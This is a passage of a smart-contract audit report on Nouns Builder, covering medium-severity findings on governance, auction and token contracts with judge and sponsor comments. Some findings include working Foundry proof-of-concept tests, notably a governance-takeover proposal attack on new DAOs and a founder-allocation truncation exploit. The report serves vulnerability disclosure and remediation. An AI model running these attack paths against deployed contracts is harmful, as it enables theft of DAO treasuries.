executed\n    if (state(_proposalId) == ProposalState.Executed) revert PROPOSAL_ALREADY_EXECUTED();\n\n    // Get a copy of the proposal\n    Proposal memory proposal = proposals[_proposalId];\n\n    // Cannot realistically underflow and `getVotes` would revert\n    unchecked {\n        // Ensure the caller is the proposer or the proposer's voting weight has dropped below the proposal threshold\n        if (msg.sender != proposal.proposer && getVotes(proposal.proposer, block.timestamp - 1) > proposal.proposalThreshold)\n            revert INVALID_CANCEL();\n    }\n\n    // Update the proposal as canceled\n    proposals[_proposalId].canceled = true;\n\n    // If the proposal was queued:\n    if (settings.treasury.isQueued(_proposalId)) {\n        // Cancel the proposal\n        settings.treasury.cancel(_proposalId);\n    }\n\n    emit ProposalCanceled(_proposalId);\n}\n```\n\n### Recommended mitigation steps\n\nConsider adding a per-account nonce storage variable (e.g. `mapping(address => uint256) internal proposalCreatorNonces;` to the `Governor` contract and include the `proposalCreatorNonces[msg.sender]++` nonce within the computed proposal id.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/182#issuecomment-1257328207):**\n > The Warden has shown how, a motivated attacker can consistently grief the DAO with multiple spam proposals, that front-run the \"official\" ones, with the goal of cancelling them and preventing them to go through.\n> \n> This exploit can be performed as long as the attacker has sufficient balance to be a `Proposer`.\n> \n> The only saving grace from this finding being a High Severity is that there are ways to avoid the front-running.\n> \n> Specifically a proposer could:\n> - Use a private relayer\n> - Ask a miner / proposer to mine the tx\n> \n> Additionally, the Proposer could use a contract, which would loop through proposals, by using a source of randomness to try a bunch of new proposals.\n> \n> Because checking if a proposal exists is cheaper than writing it (2.1k vs 20k to write in a storage slot), the write can eventually come up with one proposal the attacker didn't perform.\n> \n> However the remediation requires a new contract, not available at this time.\n> \n> The reason why this remediation is possible is that the `_description` parameter is used to uniquely identify a proposal, this allows to create gibberish strings until we get one that goes through.\n> \n> Because the attack is:\n> - Possible\n> - Easy to implement<br>\n> But can be sidestepped, via a fairly complicated process\n> \n> I think Medium Severity to be appropriate.\n> \n> Remediation would be to add the proposer address as part of the proposal id identifier.\n\n**[kulkarohan (Nouns Builder) confirmed](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/182)**\n\n\n\n***\n\n## [[M-15] Malicious pausing the contract](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/719)\n*Submitted by V\\_B*\n\n[Auction.sol#L204](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L204)<br>\n[Auction.sol#L206](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L206)<br>\n[Auction.sol#L235](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L235)<br>\n\nThere is a function `_createAuction` in `Auction` contract.\n\nIt consists of the following logic:\n\n    /// @dev Creates an auction for the next token\n    function _createAuction() private {\n        // Get the next token available for bidding\n        try token.mint() returns (uint256 tokenId) {\n            **creating of the auction for token with id equal to tokenId**\n\n            // Pause the contract if token minting failed\n        } catch Error(string memory) {\n            _pause();\n        }\n    }\n\nAccording to the [EIP-150](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md) `call` opcode can consume as most `63/64` of parrent calls' gas. That means `token.mint()` can fail since there will be no gas.\n\nAll in all, if `token.mint()` fail on gas and the rest gas is enough for pausing the contract by calling `_pause` in `catch` statement the contract will be paused.\n\nPlease note, that a bug can be exploitable if the token.mint() consume more than 1.500.000 of gas, because 1.500.000 / 64 > 20.000 that need to pause the contract. Also, the logic of `token.mint()` includes traversing the array up to 100 times, that's heavy enough to reach 1.500.000 gas limit.\n\n### Impact\n\nContract can be paused by any user by passing special amount of gas for the call of `settleCurrentAndCreateNewAuction` (which consists of two internal calls of `_settleAuction` and `_createAuction` functions).\n\n### Recommended Mitigation Steps\n\nAdd a special check for upper bound of `gasLeft` at start of `_createAuction` function.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/719#issuecomment-1251653736):**\n > Honestly I'm really impressed by the submission, however I think the quote:\n> \n> `Please note, that a bug can be exploitable if the token.mint() consume more than 1.500.000 of gas, because 1.500.000 / 64 > 20.000 that need to pause the contract. Also, the logic of token.mint() includes traversing the array up to 100 times, that's heavy enough to reach 1.500.000 gas limit.`<br>\n> shows that the likelihood of this happening is extremely small, the base mint will cost between 20k and 40k gas, and each instance of the loop should roughly cost 5k, with the minting instance costing around 5k + up to 50k\n> \n> From basic napkin math this is actually surprisingly possible<br>\n> <img width=\"721\" alt=\"Screenshot 2022-09-20 at 00 56 54\" src=\"https://user-images.githubusercontent.com/13383782/191133542-1a17c58b-2cf1-4eb4-a0c8-36b5546aa62c.png\">\n> \n> However I believe the odds of this happening are extremely low as you'd need to have at least 20 tokens being minted to founders<br>\n> <img width=\"795\" alt=\"Screenshot 2022-09-20 at 00 58 15\" src=\"https://user-images.githubusercontent.com/13383782/191133675-9b226a11-b391-4d7a-a9a6-beaed8cd88b3.png\">\n> \n> I think Med is more appropriate for now, I really like the catch of the OOG exploit, however I may have to downgrade further as the worst case scenario being pausing is not impactful.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/719#issuecomment-1257329224):**\n > I believe the finding to be valid and Medium Severity as the conditions are non-trivial, but the impact is Denial of Service which can be triggered predictably given the circumnstances.\n\n**[iainnash (Nouns Builder) confirmed](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/719)**\n\n\n\n***\n\n## [[M-16] Auction parameters can be changed during ongoing auction](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/450)\n*Submitted by &#95;&#95;141345&#95;&#95;, also found by pauliax, rbserver, rvierdiiev, and sorrynotsorry*\n\n[Auction.sol#L307-L335](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L307-L335)<br>\n\nThe auction parameters can be changed anytime, even during ongoing auctions, and take effect immediately. Users may need time to react to the changes. The impacts maybe followings:\n\n*   some sudden changes may cause bidder's transaction fail, such as `setReservePrice()` and `setMinimumBidIncrement()`\n*   some changes may change users expectation about the auction, such as `setDuration()` and `setTimeBuffer()`, with different time parameters, bidders will use different strategy\n\n### Proof of Concept\n\nsrc/auction/Auction.sol\n\n```solidity\n    function setDuration(uint256 _duration) external onlyOwner {\n        settings.duration = SafeCast.toUint40(_duration);\n\n        emit DurationUpdated(_duration);\n    }\n\n    function setReservePrice(uint256 _reservePrice) external onlyOwner {\n        settings.reservePrice = _reservePrice;\n\n        emit ReservePriceUpdated(_reservePrice);\n    }\n\n    function setTimeBuffer(uint256 _timeBuffer) external onlyOwner {\n        settings.timeBuffer = SafeCast.toUint40(_timeBuffer);\n\n        emit TimeBufferUpdated(_timeBuffer);\n    }\n\n    function setMinimumBidIncrement(uint256 _percentage) external onlyOwner {\n        settings.minBidIncrement = SafeCast.toUint8(_percentage);\n\n        emit MinBidIncrementPercentageUpdated(_percentage);\n    }\n```\n\n### Recommended Mitigation Steps\n\n- Do not apply changed parameters on ongoing auctions \n- Add a timelock for the changes\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/450#issuecomment-1257942118):**\n > The Warden has shown how settings can be changed mid-auction, this can create undefined behaviour (insta-settlement, change of price).\n> \n> While max loss is one token or the inability to settle the auction, because this could create a \"social accident\", I believe that Medium Severity is appropriate.\n> \n> Changes should either be cached in the Auction Parameters, or should be applied to the next auction to avoid any unexpected surprise\n\n**[kulkarohan (Nouns Builder) confirmed](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/450)**\n\n\n\n***\n\n## [[M-17] A proposal can pass with 0 votes in favor at early DAO stages](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/436)\n*Submitted by azephiar, also found by &#95;&#95;141345&#95;&#95;, bin2chen, cccz, davidbrai, pauliax, R2, rbserver, and Solimander*\n\nIt's possible to create a proposal for a DAO as soon as it's deployed and the proposal can pass even if nobody votes.\n\nThis possibility of doing so is based on the following assumptions:\n\n1.  The vetoer doesn't veto the proposal\n2.  `proposal.quorumVotes` is 0, which happens when `token.totalSupply() * settings.quorumThresholdBps < 10_000`\n3.  `proposal.proposalThreshold` is 0, which happens when `token.totalSupply() * settings.proposalThresholdBps < 10_000`\n\nThe amount of time necessary to create and execute a proposal of this kind is dictated by `governor.settings.votingDelay + governor.settings.votingDelay + treasury.delay()`, the lower the time the higher the risk.\n\n### Impact\n\nA malicious actor could build an off-chain script that tracks `DAODeployed` events on the `Manager.sol` contract. Every time a new DAO is spawned the script submits a proposal. This attack is based on the fact that such at an early stage nobody might notice and the chances of this happening are made real because every new DAO can be targeted.\n\nA potential proposal created by an attacker might look like this:\n\n1.  Call `governor.updateVetoer(attacker)`\n2.  Call `governor.updateVotingDelay(0)`\n3.  Call `governor.updateVotingPeriod(0)`\n4.  Call `treasury.updateGracePeriod(0)`\n5.  Call `treasury.updateDelay(1 day)`\n\nWith this setup the attacker can make a proposal and queue it immediately to then execute it after 1 day time; which gives him the time to veto any proposal that tries to interfere with the attack. At this point the attacker has sudo powers and if there's any bid he can take the funds.\n\nThis is just one possible attack path, but the point is making a proposal pass can give an attacker sudo powers and nobody might notice for a while.\n\n### Proof of Concept\n\nHere's a test I wrote that proves the attack path outlined above, you can copy it into `Gov.t.sol` and execute it with `forge test -m test_sneakProposalAttack`:\n\n```javascript\n function test_sneakProposalAttack() public {\n        address attacker = vm.addr(0x55);\n\n        address[] memory targets = new address[](5);\n        uint256[] memory values = new uint256[](5);\n        bytes[] memory calldatas = new bytes[](5);\n\n        // 1. Call `governor.updateVetoer(attacker)`\n        targets[0] = address(governor);\n        values[0] = 0;\n        calldatas[0] = abi.encodeWithSignature(\"updateVetoer(address)\", attacker);\n\n        // 2. Call `governor.updateVotingDelay(0)`\n        targets[1] = address(governor);\n        values[1] = 0;\n        calldatas[1] = abi.encodeWithSignature(\"updateVotingDelay(uint256)\", 0);\n\n        //3. Call `governor.updateVotingPeriod(0)`\n        targets[2] = address(governor);\n        values[2] = 0;\n        calldatas[2] = abi.encodeWithSignature(\"updateVotingPeriod(uint256)\", 0);\n\n        //3. Call `treasury.updateGracePeriod(0)`\n        targets[3] = address(treasury);\n        values[3] = 0;\n        calldatas[3] = abi.encodeWithSignature(\"updateGracePeriod(uint256)\", 0);\n\n        //4. Call `treasury.updateDelay(1 day)`\n        targets[4] = address(treasury);\n        values[4] = 0;\n        calldatas[4] = abi.encodeWithSignature(\"updateDelay(uint256)\", 60 * 60 * 24);\n\n        //Attacker creates proposal as soon as contract is deployed\n        bytes32 proposalId = governor.propose(targets, values, calldatas, \"\");\n\n        //Wait for proposal.voteEnd\n        vm.warp((governor.getProposal(proposalId).voteEnd));\n\n        //Queue it\n        governor.queue(proposalId);\n\n        //Wait for treasury delay\n        vm.warp(block.timestamp + treasury.delay());\n\n        //Execute proposal\n        governor.execute(targets, values, calldatas, keccak256(bytes(\"\")));\n\n        //Shows it's now possible for an attacker to queue a proposal immediately\n        bytes32 proposalId2 = governor.propose(targets, values, calldatas, \"mock\");\n        governor.queue(proposalId2);\n\n        //And executed it after one day\n        vm.warp(block.timestamp + 60 * 60 * 24);\n        governor.execute(targets, values, calldatas, keccak256(bytes(\"mock\")));\n    }\n\n```\n\n### Recommended Mitigation Steps\n\nThis potential attack path comes from a combination of factors, maninly:\n\n1.  A proposal can be created directly after deployment\n2.  The `proposal.proposal.proposalThreshold` and `proposal.quorumVotes` are set to 0 at such early stages\n3.  A proposal with 0 votes is allowed to pass\n\nI would say that requiring at least 1 vote for a proposal to be considered `Succeeded` is rational and should mitigate this problem because that would require the attacker to bid on auction to get 1 voting power, increasing the cost and the time necessary for the attack.\n\nAt [Governor.sol#L441](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L441) we have:\n\n```javascript\nelse if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {\n        return ProposalState.Defeated;\n}\n```\n\nwhich can be changed to:\n\n```javascript\nelse if (proposal.forVotes == 0 || proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {\n        return ProposalState.Defeated;\n}\n```\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/436#issuecomment-1251512891):**\n > If total supply == 0, means it's conditional, disagree with High.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/436#issuecomment-1258033484):**\n > The Warden has shown how, because of rounding of numbers and a lack of an absolute value, a proposal can be proposed and made to pass with zero votes.\n> \n> This is contingent on:\n> - Holders not voting against\n> - Vetoer not responding\n> - TotalSupply being low enough\n> \n> And the impact is limited to the funds available to the treasury at that time (expected to be low compared to a more mature protocol).\n> \n> Because of the above, I believe Medium Severity to be more appropriate.\n\n**[kulkarohan (Nouns Builder) confirmed](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/436)**\n\n\n\n***\n\n## [[M-18] Precision is not enough for `proposalThreshold` and quorum. Collections with at least 20000 NFTs in total supply may have some trouble.](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/335)\n_Submitted by Chom_\n\n[Governor.sol#L465-L477](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L465-L477)<br>\n\nPrecision is not enough for proposalThreshold and quorum. Collections with at least 20000 NFTs in total supply may have some trouble. These collections can't be set proposalThreshold = 1 or quorum = 1.\n\n### Proof of Concept\n\n        /// @notice The current number of votes required to submit a proposal\n        function proposalThreshold() public view returns (uint256) {\n            unchecked {\n                return (settings.token.totalSupply() * settings.proposalThresholdBps) / 10_000;\n            }\n        }\n\n        /// @notice The current number of votes required to be in favor of a proposal in order to reach quorum\n        function quorum() public view returns (uint256) {\n            unchecked {\n                return (settings.token.totalSupply() * settings.quorumThresholdBps) / 10_000;\n            }\n        }\n\nIf totalSupply = 20000, with the lowest settings (settings.proposalThresholdBps, settings.quorumThresholdBps = 1), it would returns (20000 &ast; 1) / 10000 = 2. And it can't be lowered more.\n\n### Recommended Mitigation Steps\n\nIncrease division to a more precise value such as 1e18 to allow high total supply NFT to always set threshold as 1\n\n        /// @notice The current number of votes required to submit a proposal\n        function proposalThreshold() public view returns (uint256) {\n            unchecked {\n                return (settings.token.totalSupply() * settings.proposalThresholdBps) / 1e18;\n            }\n        }\n\n        /// @notice The current number of votes required to be in favor of a proposal in order to reach quorum\n        function quorum() public view returns (uint256) {\n            unchecked {\n                return (settings.token.totalSupply() * settings.quorumThresholdBps) / 1e18;\n            }\n        }\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/335#issuecomment-1258038607):**\n > While I think more could have been said, this report quantifies how the quorum math can be rounded down to zero.\n> \n> Because the math is used to manage value, and allowances, I agree with Medium Severity.\n> \n> I recommend end users to Fuzz Test the settings to visualize a rational quorum that prevents it from being too low.\n\n**[kulkarohan (Nouns Builder) acknowledged](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/335)**\n\n\n\n***\n\n## [[M-19] `Governor` - Quorum could be less than intended](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/195)\n_Submitted by Picodes, also found by CertoraInc and Chom_\n\nThere could be tokens minted between the `quorum` computation and the vote, which would lead to a quorum lower than intended. It could be an issue at the beginning of the `Token` lifecycle, when the total supply is still low.\n\n### Proof of Concept\n\nWhen creating a proposal in the `Governor` contract, [`proposal.quorumVotes`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L168) is computed during the `propose` tx. However tokens could be minted after the `propose` in the same block. In this case, they'll still have a vote during the proposal due to how [`token.getPastVotes`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L462) works, therefore the quorum will be lower than intended given the actual total supply.\n\n### Recommended Mitigation Steps\n\nEither compute the total supply afterwards, for example at the beginning of the vote, either takes the vote with a timestamp of `proposal.timeCreated` - 1 to not count the block during which the tx was submitted.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/195#issuecomment-1258043036):**\n > The Warden has shown how the quorum value can be manipulated because instead of checking for the totalSupply at time of creation, the Governor checks for a totalSupply that can change.\n> \n> This is tied to the burning mechanism, so a refactor of both would be necessary.\n> \n> Alternatively this could be a nofix, however admins and end users should be aware that the Quorum math will be inconsistent due to that check.\n> \n> Because the quorum is tied to actions that can cause a leak of value or theft, I agree with Medium Severity.\n\n**[tbtstl (Nouns Builder) acknowledged and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/195#issuecomment-1258472285):**\n > ACK on this confusion – but this is the current behaviour of both Nouns and Lil Nouns, so I'd say it is intentional for now – we may want to adjust this in a future upgrade.\n\n\n\n***\n\n## [[M-20] Attackers can increase voting power by incentivizing](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/479)\n_Submitted by Tomo_\n\nIf the benefit to be gained from the outcome of the vote is less than the cost of obtaining the right to vote, the outcome of the vote is influenced.\n\n### Proof of Concept\n\n*   [Governor.sol#L248-L297](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L248-L297)<br>\n*   [Vampire Attack Explained](https://finematics.com/vampire-attack-sushiswap-explained)<br>\n\n### Recommended Mitigation Steps\n\n*   Add blacklist check for `_castVote` function.\n\n```solidity\nif(isBlacklisted(msg.sender) revert BLACKLISTED();\n```\n\n*   Create a function to delete the voting power and add the address to the blacklist.\n\n```solidity\nfunction addBlackList(address _blackList) external onlyOwner {\n\t\tisBlackListed[_blackList] = true;\n\t\temit Blacklisted(_blackList);\n}\n\nfunction deleteVotingPower(address _blackListed,uint _weight, uint _support) external onlyOwner {\n    if (_support > 2) revert INVALID_VOTE();\n    require(hasVoted[_proposalId][_blackListed],\"NO VOTING BY BLACKLISTED\");\n    if (_support == 0) {\n      proposal.againstVotes -= _weight;\n  } else if (_support == 1) {\n      proposal.forVotes -= _weight;\n  } else if (_support == 2) {\n      // Update the total number of votes abstaining\n      proposal.abstainVotes -= _weight;\n  }\n}\n```\n\n### Similar Issue\n\n*   <https://github.com/code-423n4/2022-05-aura-findings/issues/278>\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/479#issuecomment-1251423298):**\n > Nice idea, not sure if there's any way to avoid this.\n> \n> Allowlist would cause centralization issue, and would be defeated by the bribes as well.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/479#issuecomment-1258368976):**\n > While I think the finding can be further developed. I have to concede that via bribes and incentives, governance can be skewed to act against the interest of the founders.\n> \n> Whether this is good or bad per see, is not that relevant, however the system does allow delegation to a \"malicious party\" which would be able to obtain enough votes to do whatever they want.\n> \n> Notice that the veto system prevents this as well, so we could argue that removing Vetoing allows this, which is effectively another take on a 51% attack.\n> \n> Leaving as unique for the thought-provoking idea.\n\n**[kulkarohan (Nouns Builder) disputed and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/479#issuecomment-1261504746):**\n > This is why veto power is granted to founders. Not an issue IMO and would introduce needless complexity + centralization going the blacklist route.  \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/479#issuecomment-1265707141):**\n > Per the discussion above, taking into consideration that CodeArena is a end-user facing project, meaning our reports could be used to determine if a project is safe or not;\n> \n> Given the recent example of large scale bribes to [influence a voting outcome](https://tribe.fei.money/t/fully-repay-fuse-bad-debt/4528)\n> \n> While disagreeing as well with the solution of offering a Blocklist to prevent malicious actor, and agreeing that the finding should have been better written.\n> \n> I have to rationally concede that the ability to bribe governance can be used to extract value from the Treasury, a Vetoer may or may not offer protection at that time due to second order social consequences.\n> \n> Because of that, given the rules (Loss of Value conditional on externalities), given the precedents (one linked above, I'm sure there's many other), I still believe that this is a valid Medium Severity finding.\n> \n> Per the comment by the sponsor, a properly aligned Vetoer will be able to prevent most of these attacks, however I don't think that's sufficient to make the finding invalid.\n\n\n\n***\n\n## [[M-21] Truncation in casting can lead to a founder receiving all the base tokens](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/303)\n*Submitted by CertoraInc, also found by 0xSky, antonttc, bin2chen, izhuer, pcarranzav, peritoflores, PwnPatrol, rbserver, scaraven, Tomo, V\\_B, wagmi, and zzzitron*\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L71-L126><br>\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L88>\n\nThe initialize function of the `Token` contract receives an array of `FounderParams`, which contains the ownership percent of each founder as a `uint256`. The initialize function checks that the sum of the percents is not more than 100, but the value that is added to the sum of the percent is truncated to fit in `uint8`. This leads to an error because the value that is used for assigning the base tokens is the original, not truncated, `uint256` value.\n\nThis can lead to wrong assignment of the base tokens, and can also lead to a situation where not all the users will get the correct share of base tokens (if any).\n\n### Proof of Concept\n\nTo verify this bug I created a foundry test. You can add it to the test folder and run it with `forge test --match-test testFounderGettingAllBaseTokensBug`.\n\nThis test deploys a token implementation and an `ERC1967` proxy that points to it, and initializes the proxy using an array of 2 founders, each having 256 ownership percent. The value which is added to the `totalOwnership` variable is a `uint8`, and when truncating 256 to fit in a `uint8` it will turn to 0, so this check will pass.\n\nAfter the call to initialize, the test asserts that all the base token ids belongs to the first founder, which means the second founder didn't get any base tokens at all.\n\nWhat actually happens here is that the first founder gets the first 256 token ids, and the second founder gets the next 256 token ids, but because the base token is calculated % 100, only the first 100 matters and they will be owned by the first owner.\n\nThis happens because `schedule`, which is equal to `100 / founderPct`, will be zero (`100 / 256 == 0` due to uint div operation), and the base token id won't be updated in `(baseTokenId += schedule) % 100` (this line contains another mistake, which will be reported in another finding). The place where it will be updated is in the `_getNextTokenId`, where it will be incremented by 1.\n\nThis exploit can work as long as the sum of the percents modulo 256 (truncation to `uint8`) is not more than 100.\n\n```sol\n// The relative path of this file is \"test/FounderGettingAllBaseTokensBug.t.sol\"\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.15;\n\nimport { Test } from \"forge-std/Test.sol\";\n\nimport { IManager } from \"../src/manager/Manager.sol\";\nimport { IToken, Token } from \"../src/token/Token.sol\";\n\nimport { TokenTypesV1 } from \"../src/token/types/TokenTypesV1.sol\";\n\nimport { ERC1967Proxy } from \"../src/lib/proxy/ERC1967Proxy.sol\";\n\ncontract FounderGettingAllBaseTokensBug is Test, TokenTypesV1 {\n\n    Token imp;\n    address proxy;\n    \n    function setUp() public virtual {\n        // Deploying the implementation and the proxy\n        imp = new Token(address(this));\n        proxy = address(new ERC1967Proxy(address(imp), \"\"));\n    }\n\n    function testFounderGettingAllBaseTokensBug() public {\n\n        IToken token = IToken(proxy);\n\n        address chadFounder = address(0xdeadbeef);\n        address betaFounder = address(0xBBBBBBBB); // beta\n\n        // Creating 2 founders with `ownershipPct = 256`\n        IManager.FounderParams[] memory founders = new IManager.FounderParams[](2);\n        founders[0] = IManager.FounderParams({\n            wallet: chadFounder,\n            ownershipPct: 256,\n            vestExpiry: 1 weeks\n        });\n        founders[1] = IManager.FounderParams({\n            wallet: betaFounder,\n            ownershipPct: 256,\n            vestExpiry: 1 weeks\n        });\n\n        // Initializing the proxy with the founders data\n        token.initialize(   \n            founders, \n            // we don't care about these\n            abi.encode(\"\", \"\", \"\", \"\", \"\"),\n            address(0),\n            address(0)\n        );\n\n        // Asserting that the chad founder got all the base token ids\n        // (`tokenId % 100` is calculated to get the base token, so it is enough to check only the first 100 token ids)\n        for (uint i; i < 100; ++i) {\n            assertEq(token.getScheduledRecipient(i).wallet == chadFounder, true);\n        }\n\n        // Run with `forge test --match-test testFounderGettingAllBaseTokensBug`\n        // Results:\n        //      [PASS] testFounderGettingAllBaseTokensBug() (gas: 13537465)\n        // Great success\n    }\n```\n\n### Tools Used\n\nManual audit & foundry for the PoC\n\n### Recommended Mitigation Steps\n\nDon't truncate the `founderPct` variable to a uint8 when adding it to the totalOwnership variable, or alternatively check that it is less than `type(uint8).max` (or less or equal to 100).\nAfter applying this fix and running the test again, the result is:\n\n    [FAIL. Reason: INVALID_FOUNDER_OWNERSHIP()] testFounderGettingAllBaseTokensBug() (gas: 58674)\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/303#issuecomment-1257266323):**\n > While this creates other issues (infinite loop), I will judge it separately as if the infinite loop was fixed, founders would be getting above 100% allocation.\n\n**[kulkarohan (Nouns Builder) confirmed](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/303)**\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/303#issuecomment-1258505804):**\n > The Warden has shown how, due to a unsafe casting, and mixed usage of variables, what is supposed to be a percentage of tokens receiveable by founders can reach a number above 100%.\n> \n> Beside an infinite loop, this can be used to sneakily set all future tokens, to have `tokenRecipient[_tokenId].wallet` set to a founder.\n> \n> I believe that a High Severity is not out of place for what is a unchecked overflow that can be abused, however, the specific attack vector that would trigger this can only be triggered at initial setup.\n> \n> Only the deployers can set founders and their percentages to be above 100%, and this can only happen at deployment.\n> \n> For that reason, I think Medium Severity is more appropriate.\n> \n> I invite all users to verify that the sum of all `founderPct` is way below 100% and I believe mitigation consists of either performing the safe cast, or changing the code to revert if allocation is above a more realistic value\n\n**[kulkarohan (Nouns Builder) disagreed with severity and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/303#issuecomment-1266128288):**\n > Per the following line, any founder that's specified with a percentage ownership that results in the total ownership exceeding 100 will cause the function to revert: [Token.sol#L88](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L88).\n> \n> Therefore the function would never actually reach ` uint256 schedule = 100 / founderPct;` if the provided PoC were the case.\n> \n> There is however a small mistake in casting `uint8(founderPct)`, which is completely unnecessary on our part. But I believe this is a low/QA issue at best.\n\n\n\n***\n\n## [[M-22] Owners receive more percentage of total nft if some nfts were burned(because were not sold)](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/94)\n_Submitted by rvierdiiev_\n\nAccording to Nouns Builder, founder can have percentage of created nft. This is set in `Token::_addFounders` function.\nWhen new nft is minted by `mint` function then total supply of tokens is incremented and assigned to tokenId using `tokenId = settings.totalSupply++`. Then this token is checked if it should be mint to founder(then again increment total supply of tokens) or should be mint to auction using `while (_isForFounder(tokenId))`.\n\nIf token wasn't sold during the auction then auction burns it using `burn` function. And this function doesn't decrement `settings.totalSupply` value. But total supply **has changed** now, it has decreased by one.\n\nSo suppose that we have 1 founder of dao that should receive 2% of nft, that means that if 100 nft are available(for example), then 2 of them belongs to that founder. If we have minted 100 nft and 10 of them were not sold(they were then burned), then there are 90 nft available now. And in current implementation founder has ownership of 2 of them, however **2 is not 2% of 90**. So in case when nft are not sold on auction the percentage of founder's tokens is increasing and the increasing speed depends on how many tokens were not sold. Also founder gets more power in the community(as he has more percentage now).\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L71-L126><br>\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L154><br>\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L207-L213>\n\n### Recommended Mitigation Steps\n\nWhen `burn` function is called then do `settings.totalSupply--`.\n\n**[kulkarohan (Nouns Builder) confirmed](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/94)**\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/94#issuecomment-1258515434):**\n > In contrast to [#423](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/423), this report is arguing the fairness of token distribution when a token is burned.\n> \n> I think that, because they are relating to a different aspect, this report is unique, however, because the impact and mechanism is based on burn not changing totalSupply, and \"accounting being incorrect\" because of that, then I believe this is also a Medium Severity finding.\n\n\n\n***\n\n## [[M-23] Changing treasury owner through `transferOwnership()` can break `Governer.sol` and `Auction.sol`](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/468)\n_Submitted by scaraven_\n\n[Governor.sol#L21](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L21)<br>\n[Ownable.sol#L63](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/utils/Ownable.sol#L63)<br>\n[Auction.sol#L22](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L22)<br>\n\n`governor.transferOwnership()` and `Auction.transferOwnership()` is exposed to `Treasury.sol` and can be called in a governance proposal. If this is used then it causes an inconsistency between the owner of these contracts and `settings.treasury` which would prevent governance from ever modifying its own parameters and Ethereum from auctions will be sent to the wrong address.\n\nI believe medium severity is suitable because we lose partial control of governance and/or ETH from auctions, assuming that a proposal (malicious or not) is passed which changes contract 